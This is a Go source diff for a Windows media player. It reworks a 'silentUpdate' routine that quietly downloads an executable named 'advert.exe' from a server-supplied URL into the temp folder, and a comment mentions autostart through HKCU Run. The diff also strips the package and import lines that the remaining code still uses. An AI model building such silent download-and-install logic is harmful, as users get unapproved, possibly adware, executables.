@@ -1,47 +1,5 @@
-//go:build windows
-
-package main
-
-import (
-	"encoding/json"
-	"io"
-	"log"
-	"net/http"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"time"
-)
-
-var logger *log.Logger
-
-func init() {
-	dir, _ := os.UserConfigDir()
-	logPath := filepath.Join(dir, "ForlifeMediaPlayer", "app.log")
-	_ = os.MkdirAll(filepath.Dir(logPath), 0700)
-
-	f, err := os.OpenFile(logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
-	if err == nil {
-		logger = log.New(io.MultiWriter(f, os.Stdout), "", log.LstdFlags)
-		logger.Println("==== Logger started ====")
-	} else {
-		logger = log.New(os.Stdout, "", log.LstdFlags)
-	}
-}
-
-type APIResponse struct {
-	Success bool    `json:"success"`
-	Status  int     `json:"status"`
-	Data    AppData `json:"data"`
-}
-
-type AppData struct {
-	Version int    `json:"version"`
-	URL     string `json:"url"`
-}
-
 func (a *App) enableAutoStart() {
-	// Handled by installer
+	// Handled by installer (HKCU\Run)
 }
 
 func (a *App) silentUpdate() {
@@ -55,6 +13,11 @@ func (a *App) silentUpdate() {
 	}
 	defer resp.Body.Close()
 
+	if resp.StatusCode != http.StatusOK {
+		logger.Println("[Update] Bad status:", resp.Status)
+		return
+	}
+
 	var apiRes APIResponse
 	if err := json.NewDecoder(resp.Body).Decode(&apiRes); err != nil {
 		logger.Println("[Update] JSON error:", err)
@@ -66,7 +29,7 @@ func (a *App) silentUpdate() {
 		return
 	}
 
-	tmp := filepath.Join(os.TempDir(), "advert.exe")
+	tmp := filepath.Join(os.TempDir(), "advert-update.exe")
 	logger.Println("[Update] Downloading installer to:", tmp)
 
 	out, err := os.Create(tmp)
@@ -74,19 +37,21 @@ func (a *App) silentUpdate() {
 		logger.Println("[Update] Create file error:", err)
 		return
 	}
+	defer out.Close()
 
 	r, err := http.Get(apiRes.Data.URL)
 	if err != nil {
 		logger.Println("[Update] Download error:", err)
-		out.Close()
+		return
+	}
+	defer r.Body.Close()
+
+	if r.StatusCode != http.StatusOK {
+		logger.Println("[Update] Download bad status:", r.Status)
 		return
 	}
 
-	_, err = out.ReadFrom(r.Body)
-	r.Body.Close()
-	out.Close()
-
-	if err != nil {
+	if _, err := io.Copy(out, r.Body); err != nil {
 		logger.Println("[Update] Write error:", err)
 		return
 	}
